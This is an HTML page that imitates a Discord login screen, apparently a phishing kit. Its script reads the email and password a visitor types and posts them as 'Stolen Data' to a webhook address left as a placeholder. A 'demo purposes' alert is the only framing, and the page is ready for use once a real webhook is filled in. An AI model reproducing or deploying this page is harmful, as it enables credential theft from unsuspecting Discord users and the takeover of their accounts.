<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>[HISHING</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
        input { padding: 10px; margin: 5px; }
    </style>
</head>
<body>
    <h2>Discord Login</h2>
    <form id="loginForm">
        <input type="text" id="email" placeholder="Email" required><br>
        <input type="password" id="password" placeholder="Password" required><br>
        <button type="submit">Login</button>
    </form>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            
            fetch('webhook_here_guys', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: `Stolen Data:\nEmail: ${email}\nPassword: ${password}`
                })
            })
            .then(response => {
                console.log("Data sent successfully");
                alert("Data sent successfully! (For demo purposes)");
            })
            .catch(error => {
                console.error("Error sending data:", error);
            });
        });
    </script>
</body>
</html>
